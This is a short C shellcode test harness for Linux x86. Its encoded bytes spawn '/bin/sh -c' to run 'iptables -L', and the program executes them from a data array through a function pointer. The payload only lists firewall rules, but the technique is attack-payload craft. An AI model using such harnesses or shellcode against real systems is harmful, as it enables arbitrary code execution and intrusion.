
#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x12\x00\x00\x00\x2f"
"\x73\x62\x69\x6e\x2f\x69\x70\x74\x61\x62\x6c\x65\x73\x20\x2d"
"\x4c\x00\x57\x53\x89\xe1\xcd\x80";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;ret();
}
